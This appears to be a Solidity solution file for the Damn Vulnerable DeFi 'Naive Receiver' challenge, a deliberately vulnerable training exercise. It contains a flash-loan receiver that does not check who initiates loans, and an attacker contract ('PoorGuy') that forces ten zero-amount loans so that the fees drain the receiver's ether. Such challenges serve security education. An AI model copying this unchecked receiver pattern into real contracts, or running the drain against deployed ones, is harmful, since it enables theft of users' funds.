// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanReceiver {
    using Address for address payable;

    address payable private pool;

    constructor(address payable poolAddress) {
        pool = poolAddress;
    }

    // Function called by the pool during flash loan
    function receiveEther(uint256 fee) public payable {
        require(msg.sender == pool, "Sender must be pool");

        uint256 amountToBeRepaid = msg.value + fee;

        require(
            address(this).balance >= amountToBeRepaid,
            "Cannot borrow that much"
        );

        _executeActionDuringFlashLoan();

        // Return funds to pool
        pool.sendValue(amountToBeRepaid);
    }

    // Internal function where the funds received are used
    function _executeActionDuringFlashLoan() internal {}

    // Allow deposits of ETH
    receive() external payable {}
}

contract PoorGuy {
    FlashLoanReceiver receiver;
    NaiveReceiverLenderPool pool;
    address killer;

    constructor(address payable _receiver, address payable _pool) {
        killer = msg.sender;
        receiver = FlashLoanReceiver(_receiver);
        pool = NaiveReceiverLenderPool(_pool);
    }

    function killSheep() public {
        require(msg.sender == killer);
        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(address(receiver), 0);
        }
    }
}
